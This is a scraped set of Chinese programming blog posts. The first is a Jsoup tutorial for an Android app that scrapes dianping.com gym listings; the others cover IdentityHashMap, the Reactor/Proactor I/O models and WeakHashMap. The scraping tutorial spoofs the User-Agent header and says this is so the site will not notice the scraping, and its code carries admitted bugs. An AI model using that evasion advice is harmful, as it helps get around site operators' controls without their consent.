抓取数据显示而已。\n\n\n\n其次：主程序设计\n\n\n通过网页得到**点评健身场馆的url地址是：http://www.dianping.com/search/category/2/45\n抓取数据是一个耗时的操作，需要在一个线程中完成，这里使用 new Thread(runnable).start()方式，在runnable代码中获取场馆的logo、名称、地址如下：\n\n\n\n\nRunnable runnable = new Runnable() {\n        @Override\n        public void run() {\n            Connection conn = Jsoup.connect(url);\n            // 修改http包中的header,伪装成浏览器进行抓取\n            conn.header(\"User-Agent\", userAgent);\n            Document doc = null;\n            try {\n                doc = conn.get();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            //获取场馆的数据\n            Element elementDiv = doc.getElementById(\"shop-all-list\");\n            Elements elementsUl = elementDiv.getElementsByTag(\"ul\");\n            Elements elements = elementsUl.first().getElementsByTag(\"li\");\n            for (Element element : elements) {\n                Elements elements1 = element.children();\n                String targetUrl = elements1.get(0).getElementsByTag(\"a\").attr(\"href\");\n\n                String img = elements1.get(0).getElementsByTag(\"img\").first().attr(\"data-src\");\n                if (img.contains(\".jpg\")) {\n                    int a = img.indexOf(\".jpg\");\n                    img = img.substring(0, a + 4);\n                }\n\n                String radiumName = elements1.get(1).child(0).getElementsByTag(\"h4\").text();\n                String address0 = elements1.get(1).child(2).getElementsByTag(\"a\").get(1).text();\n\n                String address1 = elements1.get(1).child(2).getElementsByClass(\"addr\").text();\n\n                RadiumBean radiumBean = new RadiumBean();\n                radiumBean.setImg(img);\n                radiumBean.setName(radiumName);\n                radiumBean.setAddress(address0 + \" \" + address1);\n                list.add(radiumBean);\n            }\n            // 执行完毕后给handler发送一个空消息\n            Message message = new Message();\n            message.arg1 = Integer.parseInt(curPage);\n            handler.sendMessage(message);\n\n        }\n    };\n\n\n  \n  通过Jsoup.connect()方法，根据目标地址url来得到Connection对象，\n  将我们的app伪装成浏览器，防止人家后台发现我们在爬取人家的数据，这需要修改修改http包中的header，来设置User-Agent，此值可以在谷歌浏览器中输入“about:version”来查看，也可以访问此地址查看。\n  通过Connection对象的get()方法来获得整个页面源代码所在的Document\n  通过分析源代码，使用Document的对象来得到我们想要的数据，上面程序中img待变场馆logo的url，radiumName是小编得到的场馆的名称，address0和address1是小编得到的场馆地址的信息，这里通过组合来使用。\n  构造我们ListView所用到的数据\n  通过Handle来更新页面信息，curPage（当前页）稍后说明。\n  \n\n\n\n在得到数据后页面加载显示\n\n\n\n\nif (!list.isEmpty()) {\n            MyAdapter adapter = new MyAdapter(list, MainActivity.this);\n            info_list_view.setAdapter(adapter);\n        }\n\n4.点击跳转到场馆的详情页，这里本想用Webview加载的，但是可能是网页重定向的问题，webview也能加载出来，但一会就显示无法连接网络，所以场馆详情页就显示出了我们得到的场馆详情页的url。\n\n基本的抓取数据、加载数据流程就是这样的，但是仅仅靠上面的数据还是不能完全实现我们的效果的。\n\n\n\n完善页面，实现上下页翻页功能。\n\n\n页面在爬取数据的时候显示一个ProgressDialog来提示用户。\n\n\n\n\nProgressDialog dialog = new ProgressDialog(this);\n            dialog.setMessage(\"正在抓取数据...\");\n            dialog.setCancelable(false);\n            dialog.show();\n\n数据加载完毕，关闭此dialog。\n\n\n\n dialog.dismiss();\n\n2.ProgresDialog加载前做是否有网络的判断，有网的时候才显示ProgressDialog，无网络的时候给出提示。\n\n\n\n public boolean isNetworkAvailable(Activity activity) {\n        Context context = activity.getApplicationContext();\n        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);\n        if (cm == null)\n            return false;\n        else {   // 获取所有NetworkInfo对象\n            NetworkInfo[] networkInfo = cm.getAllNetworkInfo();\n            if (networkInfo != null && networkInfo.length > 0) {\n                for (int i = 0; i < networkInfo.length; i++)\n                    if (networkInfo[i].getState() == NetworkInfo.State.CONNECTED)\n                        return true;  // 存在可用的网络连接\n            }\n        }\n        return false;\n    }\n\n3.完善runnable，抓取当前页码、上一页、下一页的链接地址。\n\n\n\n// 获取页数的链接\n            if (firstLoad) {\n                Elements elementsPages = doc.getElementsByClass(\"content-wrap\");\n                Elements elementsPageA = elementsPages.first().getElementsByClass(\"shop-wrap\").first().child(1).getElementsByTag(\"a\");\n                for (int i = 0; i < elementsPageA.size() - 2; i++) {\n                    Element element = elementsPageA.get(i);\n                    Element element1 = element.getElementsByClass(\"cur\").first();\n                    Map<String, Object> map = new HashMap<>();\n                    if (element1 != null) {\n                        curPage = element1.text();\n                        map.put(\"page\", \"\" + (i + 1));\n                        map.put(\"url\", url);\n                        mMapList.add(map);\n                    } else {\n                        map.put(\"page\", \"\" + (i + 1));\n                        map.put(\"url\", element.attr(\"href\"));\n                        mMapList.add(map);\n                    }\n\n                }\n            }\n            firstLoad = false;\n\n因为在网页中，第一次进入返回了前9页和第50页的数据，这里只取前9页的数据，firstLoad代表第一次加载，mMapList用来存放页码和页面跳转时候的url，对js中的代码不明白的朋友们，要好好学学js，这里小编就不介绍js了，至于我为什么知道取这些字段，那是小编盯着网页源程序代码看了半天看出来的。\n\n\n这个时候就用到了之前runnable中的Message对象中的curPage\n\n\ncurPage代表当前页码，从1开始………………在handle接收到消息后显示此页码信息。\n\n\n\ntvCurrentPage.setText(\"\" + msg.arg1);\n\n\n模仿网页的上一页下一页，我们需要处理TextView的点击事件。\n\n\n下一页事件：\n\n\n\nif (curPage.equals(\"\" + (mMapList.size()))) {\n                    Toast.makeText(this, \"末页\", Toast.LENGTH_SHORT).show();\n                } else {\n                    curPage = \"\" + (Integer.parseInt(curPage) + 1);\n                    url = \"http://www.dianping.com\" + mMapList.get(Integer.parseInt(curPage) - 1).get(\"url\").toString();\n                    switchOver();\n                    tvCurrentPage.setText(curPage);\n                }\n\n上一页事件：\n\n\n\nif (curPage.equals(\"1\")) {\n                    Toast.makeText(this, \"首页\", Toast.LENGTH_SHORT).show();\n                } else {\n                    curPage = \"\" + (Integer.parseInt(curPage) - 1);\n\n                    if (curPage.equals(1)) {\n                        url = \"http://www.dianping.com/search/category/2/45\";\n                    } else {\n\n                        url = \"http://www.dianping.com\" + mMapList.get(Integer.parseInt(curPage) - 1).get(\"url\").toString();\n                    }\n                    switchOver();\n                    tvCurrentPage.setText(curPage);\n                }\n\n经过小编测试，在点击下一页的时候没有bug，在点击上一页的时候，会出现doc为null，从而奔溃的bug，小编在努力解决中，但还没解决掉。\n\n\n附上完整的runnable代码，毕竟这是此程序的关键部分。\n\n\n\n\nRunnable runnable = new Runnable() {\n        @Override\n        public void run() {\n            Connection conn = Jsoup.connect(url);\n            // 修改http包中的header,伪装成浏览器进行抓取\n            conn.header(\"User-Agent\", userAgent);\n            Document doc = null;\n            try {\n                doc = conn.get();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n\n            // 获取页数的链接\n            if (firstLoad) {\n                Elements elementsPages = doc.getElementsByClass(\"content-wrap\");\n                Elements elementsPageA = elementsPages.first().getElementsByClass(\"shop-wrap\").first().child(1).getElementsByTag(\"a\");\n                for (int i = 0; i < elementsPageA.size() - 2; i++) {\n                    Element element = elementsPageA.get(i);\n                    Element element1 = element.getElementsByClass(\"cur\").first();\n                    Map<String, Object> map = new HashMap<>();\n                    if (element1 != null) {\n                        curPage = element1.text();\n                        map.put(\"page\", \"\" + (i + 1));\n                        map.put(\"url\", url);\n                        mMapList.add(map);\n                    } else {\n                        map.put(\"page\", \"\" + (i + 1));\n                        map.put(\"url\", element.attr(\"href\"));\n                        mMapList.add(map);\n                    }\n\n                }\n            }\n            firstLoad = false;\n            //获取场馆的数据\n            Element elementDiv = doc.getElementById(\"shop-all-list\");\n            Elements elementsUl = elementDiv.getElementsByTag(\"ul\");\n            Elements elements = elementsUl.first().getElementsByTag(\"li\");\n            for (Element element : elements) {\n                Elements elements1 = element.children();\n                String targetUrl = elements1.get(0).getElementsByTag(\"a\").attr(\"href\");\n\n                String img = elements1.get(0).getElementsByTag(\"img\").first().attr(\"data-src\");\n                if (img.contains(\".jpg\")) {\n                    int a = img.indexOf(\".jpg\");\n                    img = img.substring(0, a + 4);\n                }\n\n                String radiumName = elements1.get(1).child(0).getElementsByTag(\"h4\").text();\n                String address0 = elements1.get(1).child(2).getElementsByTag(\"a\").get(1).text();\n\n                String address1 = elements1.get(1).child(2).getElementsByClass(\"addr\").text();\n//                StringBuilder stringBuilder = new StringBuilder();\n//\n//                if (elements1.get(2).child(0).children().size()>0){\n//                    String  youhui = \"\";\n//                    if (!\"\".equals(elements1.get(2).child(0).child(0).getElementsByClass(\"more\").text())){\n//                        youhui = elements1.get(2).child(0).getElementsByTag(\"a\").get(1).attr(\"title\");\n//                    }else {\n//                        youhui = elements1.get(2).child(0).getElementsByTag(\"a\").get(1).attr(\"title\");\n//\n//                    }\n//\n//                    stringBuilder.append(youhui+\"+++\");\n//                }\n                RadiumBean radiumBean = new RadiumBean();\n                radiumBean.setTargetUrl(\"http://www.dianping.com\" + targetUrl);\n                radiumBean.setImg(img);\n                radiumBean.setName(radiumName);\n                radiumBean.setAddress(address0 + \" \" + address1);\n                list.add(radiumBean);\n            }\n            // 执行完毕后给handler发送一个空消息\n            Message message = new Message();\n            message.arg1 = Integer.parseInt(curPage);\n            handler.sendMessage(message);\n        }\n    };\n\n有不明白的可以对照完整的runnable代码来理解。\n\n\n\n通过上面的步骤，我们已经完成了抓取、加载、上下页切换的效果。但但请看下面。\n\n通过小编的切身体验，发现jsoup爬虫获取数据时候的几个需要注意的地方。 \n1. 个人要会js，再强调一遍，不会js，上面我写的js的程序应该会非常的迷糊，即便会的人，因为每个人写的也不一样，也是不好看懂的。 \n2. 我们在爬取数据的时候所用的class  id 等字段一旦发生变化，那就得不到相应的标签了，页面就会发生奔溃，这一点也是致命的一点把。 \n3. 要想非常逼真的实现网页中的效果，那你就要好好的看看网页的源代码了，网页代码有很大的灵活性，需要你仔细分析记录规律。\n\n\n\n测试程序已经上传到了github，有需要的可以下载源程序。\n\n下载地址：点我点我点我\n\n欢迎访问201216323.tech来查看我的CSDN博客。\n\n欢迎关注我的个人技术公众号,快速查看我的最新文章。", "time": "2018_08_14_11_12_38", "link": "https://blog.csdn.net/ccg_201216323/article/details/53576654", "title": "网络爬虫技术Jsoup——爬到一切你想要的"}
{"timestamp": "2018_08_14_11_12_39", "desc": "在HashMap中,对于两个键值对key1-value1,key2-value2,在key相同(key1.equals(key2)==true)的情况下value1与value2不能共存,有没有一种数据结构使value1与value2共存呢?有,那就是IdentityHashMap.IdentityHashMap在比较键时候不是使用equals方法而是比较两个对象的引用,如果对象引用不同即使对象equals相同,在IdentityHashMap中也会存在两个相同的key.取值的时候同理也是比较键的引用.\n\n\n\n案例:\n\n创建两个值相同但是引用不同的String对象作为key,然后向IdentityHashMap中放入key - value1 , key - value2 \n然后输出map中全部元素,观察map中存在的元素\n\n\n\nIdentityHashMap<String, Object> map = new IdentityHashMap<>();\nmap.put(new String(\"key\"), \"value1\");\nmap.put(new String(\"key\"), \"value2\");\nmap.entrySet().stream().forEach(entry -> System.out.println(\"key -> \" + entry.getKey() + \",value -> \" + entry.getValue()));\n\n输出结果\n\n\n\nkey -> key,value -> value2\nkey -> key,value -> value1\n\nIdentityHashMap不是线程安全的,如果我们需要线程安全的IdentityHashMap\n\n我们可以使用jdk封装IdentityHashMap,封装的时机是在IdentityHashMap初始化的时候\n\n\n\nprivate HashMap<String, Object> hashMap = new HashMap<>();\n//同步封装\nMap synchMap = Collections.synchronizedMap(map);", "time": "2018_08_14_11_12_39", "link": "https://blog.csdn.net/JavaMoo/article/details/79433032", "title": "IdentityHashMap"}
{"timestamp": "2018_08_14_11_12_39", "desc": "I/O模型\n\n\n在文章《unix网络编程》（12）五种I/O模型中提到了五种I/O模型，其中前四种：阻塞模型、非阻塞模型、信号驱动模型、I/O复用模型都是同步模型；还有一种是异步模型。\n\n\n\n\nReactor模型\n\n\n        Reactor模式是处理并发I/O比较常见的一种模式，用于同步I/O，中心思想是将所有要处理的I/O事件注册到一个中心I/O多路复用器上，同时主线程/进程阻塞在多路复用器上；一旦有I/O事件到来或是准备就绪(文件描述符或socket可读、写)，多路复用器返回并将事先注册的相应I/O事件分发到对应的处理器中。\n　　Reactor是一种事件驱动机制，和普通函数调用的不同之处在于：应用程序不是主动的调用某个API完成处理，而是恰恰相反，Reactor逆置了事件处理流程，应用程序需要提供相应的接口并注册到Reactor上，如果相应的事件发生，Reactor将主动调用应用程序注册的接口，这些接口又称为“回调函数”。用“好莱坞原则”来形容Reactor再合适不过了：不要打电话给我们，我们会打电话通知你。\n       Reactor模式与Observer模式在某些方面极为相似：当一个主体发生改变时，所有依属体都得到通知。不过，观察者模式与单个事件源关联，而反应器模式则与多个事件源关联 。\n\n\n在Reactor模式中，有5个关键的参与者：\n\n\n描述符（handle）：由操作系统提供的资源，用于识别每一个事件，如Socket描述符、文件描述符、信号的值等。在Linux中，它用一个整数来表示。事件可以来自外部，如来自客户端的连接请求、数据等。事件也可以来自内部，如信号、定时器事件。同步事件多路分离器（event demultiplexer）：事件的到来是随机的、异步的，无法预知程序何时收到一个客户连接请求或收到一个信号。所以程序要循环等待并处理事件，这就是事件循环。在事件循环中，等待事件一般使用I/O复用技术实现。在linux系统上一般是select、poll、epol_waitl等系统调用，用来等待一个或多个事件的发生。I/O框架库一般将各种I/O复用系统调用封装成统一的接口，称为事件多路分离器。调用者会被阻塞，直到分离器分离的描述符集上有事件发生。事件处理器（event handler）：I/O框架库提供的事件处理器通常是由一个或多个模板函数组成的接口。这些模板函数描述了和应用程序相关的对某个事件的操作，用户需要继承它来实现自己的事件处理器，即具体事件处理器。因此，事件处理器中的回调函数一般声明为虚函数，以支持用户拓展。具体的事件处理器（concrete event handler）：是事件处理器接口的实现。它实现了应用程序提供的某个服务。每个具体的事件处理器总和一个描述符相关。它使用描述符来识别事件、识别应用程序提供的服务。Reactor 管理器（reactor）：定义了一些接口，用于应用程序控制事件调度，以及应用程序注册、删除事件处理器和相关的描述符。它是事件处理器的调度核心。 Reactor管理器使用同步事件分离器来等待事件的发生。一旦事件发生，Reactor管理器先是分离每个事件，然后调度事件处理器，最后调用相关的模 板函数来处理这个事件。\n\n       可以看出，是Reactor管理器并不是应用程序负责等待事件、分离事件和调度事件。Reactor并没有被具体的事件处理器调度，而是管理器调度具体的事件处理器，由事件处理器对发生的事件作出处理，这就是Hollywood原则。应用程序要做的仅仅是实现一个具体的事件处理器，然后把它注册到Reactor管理器中。接下来的工作由管理器来完成：如果有相应的事件发生，Reactor会主动调用具体的事件处理器，由事件处理器对发生的事件作出处理。\n\n\n\n\n\n应用场景\n\n\n场景：             长途客车在路途上，有人上车有人下车，但是乘客总是希望能够在客车上得到休息。\n传统做法：     每隔一段时间（或每一个站），司机或售票员对每一个乘客询问是否下车。\nReactor做法：汽车是乘客访问的主体（Reactor），乘客上车后，到售票员（acceptor）处登记，之后乘客便可以休息睡觉去了，当到达乘客所要到达的目的地时（指定的事件发生，乘客到了下车地点），售票员将其唤醒即可。\n\n\n\n\n为什么使用Reactor\n\n\n网络编程为什么要用反应堆？有了I/O复用，有了epoll已经可以使服务器并发几十万连接的同时，维持高TPS了，难道这还不够吗？\n       答案是，技术层面足够了，但在软件工程层面却是不够的。\n\n\n程序使用IO复用的难点在哪里呢？\n      1个请求可能由多次IO处理完成，但相比传统的单线程完整处理请求生命期的方法，IO复用在人的大脑思维中并不自然，因为，程序员编程中，处理请求A的时候，假定A请求必须经过多个IO操作A1-An（两次IO间可能间隔很长时间），每经过一次IO操作，再调用IO复用时，IO复用的调用返回里，非常可能不再有A，而是返回了请求B。即请求A会经常被请求B打断，处理请求B时，又被C打断。这种思维下，编程容易出错。\n\n\n\n\n\n\n\n\n形象例子：\n本部分和下部分内容来自：高性能网络编程6–reactor反应堆与定时器管理\n\n\n\n    传统编程方法就好像是到了银行营业厅里，每个窗口前排了长队，业务员们在窗口后一个个的解决客户们的请求。一个业务员可以尽情思考着客户A依次提出的问题，例如：\n\n“我要买2万XX理财产品。“\n\n“看清楚了，5万起售。”\n\n“等等，查下我活期余额。”\n\n“余额5万。”\n\n“那就买 5万吧。”\n\n业务员开始录入信息。\n\n”对了，XX理财产品年利率8%？”\n\n“是预期8%，最低无利息保本。“\n\n”早不说，拜拜，我去买余额宝。“\n\n业务员无表情的删着已经录入的信息进行事务回滚。\n\n”下一个！“\n\n    用了IO复用则是大师业务员开始挑战极限，在超大营业厅里给客户们人手一个牌子，黑压压的客户们都在大厅中，有问题时举牌申请提问，大师目光敏锐点名指定某人提问，该客户迅速得到大师的答复后，要经过一段时间思考，查查自己的银袋子，咨询下LD，才能再次进行下一个提问，直到得到完整的满意答复退出大厅。例如：大师刚指导A填写转帐单的某一项，B又来申请兑换泰铢，给了B兑换单后，C又来办理定转活，然后D与F在争抢有限的圆珠笔时出现了不和谐现象，被大师叫停业务，暂时等待。\n\n    这就是基于事件驱动的IO复用编程比起传统1线程1请求的方式来，有难度的设计点了，客户们都是上帝，既不能出错，还不能厚此薄彼。\n    当没有反应堆时，我们可能的设计方法是这样的：大师把每个客户的提问都记录下来，当客户A提问时，首先查阅A之前问过什么做过什么，这叫联系上下文，然后再根据上下文和当前提问查阅有关的银行规章制度，有针对性的回答A，并把回答也记录下来。当圆满回答了A的所有问题后，删除A的所有记录。\n\n\n\n\n\n\n在程序中：\n       某一瞬间，服务器共有10万个并发连接，此时，一次IO复用接口的调用返回了100个活跃的连接等待处理。先根据这100个连接找出其对应的对象，这并不难，epoll的返回连接数据结构里就有这样的指针可以用。接着，循环的处理每一个连接，找出这个对象此刻的上下文状态，再使用read、write这样的网络IO获取此次的操作内容，结合上下文状态查询此时应当选择哪个业务方法处理，调用相应方法完成操作后，若请求结束，则删除对象及其上下文。\n       这样，我们就陷入了面向过程编程方法之中了，在面向应用、快速响应为王的移动互联网时代，这样做早晚得把自己玩死。我们的主程序需要关注各种不同类型的请求，在不同状态下，对于不同的请求命令选择不同的业务处理方法。这会导致随着请求类型的增加，请求状态的增加，请求命令的增加，主程序复杂度快速膨胀，导致维护越来越困难，苦逼的程序员再也不敢轻易接新需求、重构。\n\n\n       反应堆是解决上述软件工程问题的一种途径，它也许并不优雅，开发效率上也不是最高的，但其执行效率与面向过程的使用IO复用却几乎是等价的，所以，无论是nginx、memcached、redis等等这些高性能组件的代名词，都义无反顾的一头扎进了反应堆的怀抱中。\n      反应堆模式可以在软件工程层面，将事件驱动框架分离出具体业务，将不同类型请求之间用OO的思想分离。通常，反应堆不仅使用IO复用处理网络事件驱动，还会实现定时器来处理时间事件的驱动（请求的超时处理或者定时任务的处理），就像下面的示意图：\n\n\n\n\n\n这幅图有5点意思：\n（1）处理应用时基于OO思想，不同的类型的请求处理间是分离的。例如，A类型请求是用户注册请求，B类型请求是查询用户头像，那么当我们把用户头像新增多种分辨率图片时，更改B类型请求的代码处理逻辑时，完全不涉及A类型请求代码的修改。\n\n\n（2）应用处理请求的逻辑，与事件分发框架完全分离。什么意思呢？即写应用处理时，不用去管何时调用IO复用，不用去管什么调用epoll_wait，去处理它返回的多个socket连接。应用代码中，只关心如何读取、发送socket上的数据，如何处理业务逻辑。事件分发框架有一个抽象的事件接口，所有的应用必须实现抽象的事件接口，通过这种抽象才把应用与框架进行分离。\n\n\n（3）反应堆上提供注册、移除事件方法，供应用代码使用，而分发事件方法，通常是循环的调用而已，是否提供给应用代码调用，还是由框架简单粗暴的直接循环使用，这是框架的自由。\n\n\n（4）IO多路复用也是一个抽象，它可以是具体的select，也可以是epoll，它们只必须提供采集到某一瞬间所有待监控连接中活跃的连接。\n\n\n（5）定时器也是由反应堆对象使用，它必须至少提供4个方法，包括添加、删除定时器事件，这该由应用代码调用。最近超时时间是需要的，这会被反应堆对象使用，用于确认select或者epoll_wait执行时的阻塞超时时间，防止IO的等待影响了定时事件的处理。遍历也是由反应堆框架使用，用于处理定时事件。\n\n\nReactor的几种模式\n参考资料：Scalable IO in Java\n\n\n在web服务中，很多都涉及基本的操作：read request、decode request、process service、encod reply、send reply等。\n\n\n1 单线程模式\n      这是最简单的单Reactor单线程模型。Reactor线程是个多面手，负责多路分离套接字，Accept新连接，并分派请求到处理器链中。该模型适用于处理器链中业务处理组件能快速完成的场景。不过这种单线程模型不能充分利用多核资源，所以实际使用的不多。\n\n2 多线程模式（单Reactor）\n\n\n       该模型在事件处理器（Handler）链部分采用了多线程（线程池），也是后端程序常用的模型。\n\n3 多线程模式（多个Reactor）\n       比起第二种模型，它是将Reactor分成两部分，mainReactor负责监听并accept新连接，然后将建立的socket通过多路复用器（Acceptor）分派给subReactor。subReactor负责多路分离已连接的socket，读写网络数据；业务处理功能，其交给worker线程池完成。通常，subReactor个数上可与CPU个数等同。\n\n\n\n\n\n\n\nProacotr模型\n\n       Proactor是和异步I/O相关的。\n       在Reactor模式中，事件分离者等待某个事件或者可应用或个操作的状态发生（比如文件描述符可读写，或者是socket可读写），事件分离器就把这个事件传给事先注册的处理器（事件处理函数或者回调函数），由后者来做实际的读写操作。\n       在Proactor模式中，事件处理者(或者代由事件分离者发起)直接发起一个异步读写操作(相当于请求)，而实际的工作是由操作系统来完成的。发起时，需要提供的参数包括用于存放读到数据的缓存区，读的数据大小，或者用于存放外发数据的缓存区，以及这个请求完后的回调函数等信息。事件分离者得知了这个请求，它默默等待这个请求的完成，然后转发完成事件给相应的事件处理者或者回调。\n       可以看出两者的区别：Reactor是在事件发生时就通知事先注册的事件（读写由处理函数完成）；Proactor是在事件发生时进行异步I/O（读写由OS完成），待IO完成事件分离器才调度处理器来处理。\n\n\n\n 举个例子，将有助于理解Reactor与Proactor二者的差异，以读操作为例（类操作类似）。\n在Reactor（同步）中实现读：\n - 注册读就绪事件和相应的事件处理器\n - 事件分离器等待事件\n - 事件到来，激活分离器，分离器调用事件对应的处理器。\n - 事件处理器完成实际的读操作，处理读到的数据，注册新的事件，然后返还控制权。\nProactor（异步）中的读：\n - 处理器发起异步读操作（注意：操作系统必须支持异步IO）。在这种情况下，处理器无视IO就绪事件，它关注的是完成事件。\n - 事件分离器等待操作完成事件\n - 在分离器等待过程中，操作系统利用并行的内核线程执行实际的读操作，并将结果数据存入用户自定义缓冲区，最后通知事件分离器读操作完成。\n - 事件分离器呼唤处理器。\n - 事件处理器处理用户自定义缓冲区中的数据，然后启动一个新的异步操作，并将控制权返回事件分离器。\n\n\n\n\n现行做法\n\n开源C++框架：ACE\n\n         开源C++开发框架 ACE 提供了大量平台独立的底层并发支持类(线程、互斥量等)。 同时在更高一层它也提供了独立的几组C++类，用于实现Reactor及Proactor模式。 尽管它们都是平台独立的单元，但他们都提供了不同的接口。ACE Proactor在MS-Windows上无论是性能还在健壮性都更胜一筹，这主要是由于Windows提供了一系列高效的底层异步API。(这段可能过时了点吧)\n 不幸的是，并不是所有操作系统都为底层异步提供健壮的支持。举例来说， 许多Unix系统就有麻烦。因此， ACE Reactor可能是Unix系统上更合适的解决方案。 正因为系统底层的支持力度不一，为了在各系统上有更好的性能，开发者不得不维护独立的好几份代码: 为Windows准备的ACE Proactor以及为Unix系列提供的ACE Reactor。真正的异步模式需要操作系统级别的支持。由于事件处理者及操作系统交互的差异，为Reactor和Proactor设计一种通用统一的外部接口是非常困难的。这也是设计通行开发框架的难点所在。\n       ACE是一个大型的中间件产品，代码20万行左右，过于宏大，一堆的设计模式，架构了一层又一层，使用的时候，要根据情况，看从那一层来进行使用。支持跨平台。\n设计模式 ：ACE主要应用了Reactor,Proactor等； \n层次架构 ：ACE底层是C风格的OS适配层，上一层基于C++的wrap类，再上一层是一些框架 (Accpetor,Connector,Reactor,Proactor等)，最上一层是框架上服务；\n可移植性 ：ACE支持多种平台，可移植性不存在问题，据说socket编程在linux下有不少bugs； \n事件分派处理 ：ACE主要是注册handler类，当事件分派时，调用其handler的虚挂勾函数。实现 ACE_Handler/ACE_Svc_Handler/ACE_Event_handler等类的虚函数；\n涉及范围 ：ACE包含了日志，IPC,线程池，共享内存，配置服务，递归锁，定时器等； \n线程调度 ：ACE的Reactor是单线程调度，Proactor支持多线程调度； \n发布方式 ：ACE是开源免费的，不依赖于第三方库，一般应用使用它时，以动态链接的方式发布动态库；开发难度 ：基于ACE开发应用，对程序员要求比较高，要用好它，必须非常了解其框架。在其框架下开发，往往new出一个对象，不知在什么地方释放好。\n\n\nC网络库：libevent\n\nlibevent是一个C语言写的网络库，官方主要支持的是类linux操作系统，最新的版本添加了对windows的IOCP的支持。在跨平台方面主要通过select模型来进行支持。\n设计模式 ：libevent为Reactor模式； \n层次架构：livevent在不同的操作系统下，做了多路复用模型的抽象，可以选择使用不同的模型，通过事件函数提供服务； \n可移植性 ：libevent主要支持linux平台，freebsd平台，其他平台下通过select模型进行支持，效率不是太高； \n事件分派处理 ：libevent基于注册的事件回调函数来实现事件分发；\n涉及范围 ：libevent只提供了简单的网络API的封装，线程池，内存池，递归锁等均需要自己实现；\n线程调度 ：libevent的线程调度需要自己来注册不同的事件句柄；\n发布方式 ：libevent为开源免费的，一般编译为静态库进行使用；\n开发难度 ：基于libevent开发应用，相对容易，具体可以参考memcached这个开源的应用，里面使用了 libevent这个库。 \n\n\n改进方案：模拟异步\n\n        在改进方案中，我们将Reactor原来位于事件处理器内的read/write操作移至分离器(不妨将这个思路称为“模拟异步”)，以此寻求将Reactor多路同步IO转化为模拟异步IO。\n以读操作为例子，改进过程如下：\n  - 注册读就绪事件及其处理器，并为分离器提供数据缓冲区地址，需要读取数据量等信息。\n  - 分离器等待事件（如在select()上等待）\n  - 事件到来，激活分离器。分离器执行一个非阻塞读操作（它有完成这个操作所需的全部信息），最后调用对应处理器。\n  - 事件处理器处理用户自定义缓冲区的数据，注册新的事件（当然同样要给出数据缓冲区地址，需要读取的数据量等信息），最后将控制权返还分离器。\n  如我们所见，通过对多路IO模式功能结构的改造，可将Reactor转化为Proactor模式。改造前后，模型实际完成的工作量没有增加，只不过参与者间对工作职责稍加调换。没有工作量的改变，自然不会造成性能的削弱。对如下各步骤的比较，可以证明工作量的恒定：\n标准/典型的Reactor：\n  - 步骤1：等待事件到来（Reactor负责）\n  - 步骤2：将读就绪事件分发给用户定义的处理器（Reactor负责）\n  - 步骤3：读数据（用户处理器负责）\n  - 步骤4：处理数据（用户处理器负责）\n\n改进实现的模拟Proactor：\n  - 步骤1：等待事件到来（Proactor负责）\n  - 步骤2：得到读就绪事件，执行读数据（现在由Proactor负责）\n  - 步骤3：将读完成事件分发给用户处理器（Proactor负责）\n  - 步骤4：处理数据（用户处理器负责）  \n\n       对于不提供异步IO API的操作系统来说，这种办法可以隐藏socket API的交互细节，从而对外暴露一个完整的异步接口。借此，我们就可以进一步构建完全可移植的，平台无关的，有通用对外接口的解决方案。上述方案已经由Terabit P/L公司（http://www.terabit.com.au/）实现为TProactor。它有两个版本：C++和JAVA的。C++版本采用ACE跨平台底层类开发，为所有平台提供了通用统一的主动式异步接口。\n\n\nBoost.Asio类库\n       Boost.Asio类库，其就是以Proactor这种设计模式来实现，参见：Proactor（The Boost.Asio library is based on the Proactor pattern. This design note outlines the advantages and disadvantages of this approach.），其设计文档链接：http://asio.sourceforge.net/boost_asio_0_3_7/libs/asio/doc/design/index.html\n\n\n参考资料\n\n1、Reactor构架模式及框架概述\n2、高性能网络编程6–reactor反应堆与定时器管理\n3、Scalable IO in Java\n4、Reactor - An Object Behavioral Pattern for Demultiplexing and Dispatching Handles for Synchronous Events \n5、两种高性能I/O设计模式(Reactor/Proactor)的比较\n6、Reactor模式及在DSS中的体现\n7、高性能I/O设计模式Reactor和Proactor \n8、Comparing Two High-Performance I/O Design Patterns\n\n\n            </div>\n                </div>", "time": "2018_08_14_11_12_39", "link": "https://blog.csdn.net/JavaMoo/article/details/79460867", "title": "Reactor与Proactor模型"}
{"timestamp": "2018_08_14_11_12_41", "desc": "WeakHashMap，此种Map的特点是，当除了自身有对key的引用外，此key没有其他引用那么此map会自动丢弃此值，\n\n见实例：此例子中声明了两个Map对象，一个是HashMap，一个是WeakHashMap，同时向两个map中放入a、b两个对象，当HashMap  remove掉a 并且将a、b都指向null时，WeakHashMap中的a将自动被回收掉。出现这个状况的原因是，对于a对象而言，当HashMap  remove掉并且将a指向null后，除了WeakHashMap中还保存a外已经没有指向a的指针了，所以WeakHashMap会自动舍弃掉a，而对于b对象虽然指向了null，但HashMap中还有指向b的指针，所以\n\nWeakHashMap将会保留\n\n\n\nJava代码  \n\n\n \npackage test;   \n   \nimport java.util.HashMap;   \nimport java.util.Iterator;   \nimport java.util.Map;   \nimport java.util.WeakHashMap;   \n   \npublic class Test {   \n    public static void main(String[] args) throws Exception {   \n        String a = new String(“a”);   \n        String b = new String(“b”);   \n        Map weakmap = new WeakHashMap();   \n        Map map = new HashMap();   \n        map.put(a, ”aaa”);   \n        map.put(b, ”bbb”);   \n   \n           \n        weakmap.put(a, ”aaa”);   \n        weakmap.put(b, ”bbb”);   \n           \n        map.remove(a);   \n           \n        a=null;   \n        b=null;   \n           \n        System.gc();   \n        Iterator i = map.entrySet().iterator();   \n        while (i.hasNext()) {   \n            Map.Entry en = (Map.Entry)i.next();   \n            System.out.println(”map:”+en.getKey()+“:”+en.getValue());   \n        }   \n   \n        Iterator j = weakmap.entrySet().iterator();   \n        while (j.hasNext()) {   \n            Map.Entry en = (Map.Entry)j.next();   \n            System.out.println(”weakmap:”+en.getKey()+“:”+en.getValue());   \n               \n        }   \n    }   \n   \n       \n}  \n\n\n 